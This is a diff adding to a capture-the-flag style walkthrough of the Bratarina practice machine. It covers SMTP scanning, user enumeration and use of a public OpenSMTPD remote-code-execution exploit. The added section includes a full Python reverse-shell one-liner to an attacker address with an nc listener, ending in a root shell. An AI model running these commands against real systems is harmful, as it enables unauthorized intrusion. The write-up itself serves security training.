@@ -117,9 +117,106 @@ From the above scan we have 3 ports opened, port 22 which runs ssh, port 25 whic
 
 <h2>Enumeration Port 25</h2>
 
+Lets try to check if there is an exploit for this smtp version
+
+>command:nmap -p 25 --script smtp-vuln*.nse 192.168.91.71
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Bratarina]
+└─$ nmap -p 25 --script smtp-vuln*.nse 192.168.91.71                                                     
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 17:02 WAT
+Nmap scan report for 192.168.91.71
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+
+Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds
+
+```
+Okay, it is not vulnerable to the available exploit hehe. Lets try to see if we can get usernames 
+
+>command:smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.82.71 -p 25
+
+```
+──(bl4ck4non㉿bl4ck4non)-[~]
+└─$ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.82.71 -p 25
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
+Target count ............. 1
+Username count ........... 168
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Wed Mar  1 16:27:50 2023 #########
+######## Scan completed at Wed Mar  1 16:28:16 2023 #########
+0 results.
+
+168 queries in 26 seconds (6.5 queries / sec)
+
+```
+oops, there's nothing hehe
+
+Then I went back to my scan and found something
+
+![image](https://user-images.githubusercontent.com/67879936/222197594-dfa51204-9db1-4d60-a103-121ee3786a6a.png)
+
+Checking for the exploit of that version online, I found this
+
+>link to exploit:https://www.exploit-db.com/exploits/47984
 
 
 
+<h3>Exploitation Port 25</h3>
+
+Download that exploit to your machine and lets try to run it
+ 
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Bratarina]
+└─$ python 47984.py                                                                              
+Usage 47984.py <target ip> <target port> <command>
+E.g. 47984.py 127.0.0.1 25 'touch /tmp/x'
+
+```
+Alright, so lets try to run it using the format we were given
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Bratarina]
+└─$ python 47984.py 192.168.91.71 25 whoami              
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+```
+Alright, our payload got sent successfully hehe
+
+Now, lets try to execute our reverse shell so we can get a shell back on our machine.
+
+For this we'll be using 2 different terminals
+
+>command terinal 1:python 47984.py 192.168.91.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.91\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
+
+>command terminal 2:rlwrap nc -lvnp 80
+
+Ensure you change the $IP to your own IP address
+
+![image](https://user-images.githubusercontent.com/67879936/222204177-72c4a2d7-483a-40a3-a460-e8ad1e3e40bb.png)
+
+![image](https://user-images.githubusercontent.com/67879936/222204274-fe5792e8-ff93-440f-99ad-24d3d2c504c9.png)
+
+Boom!!! We got a shell as root. This means we don't need to go through the stress of checking other ports xD
+
+That will be all for today
 
 
 
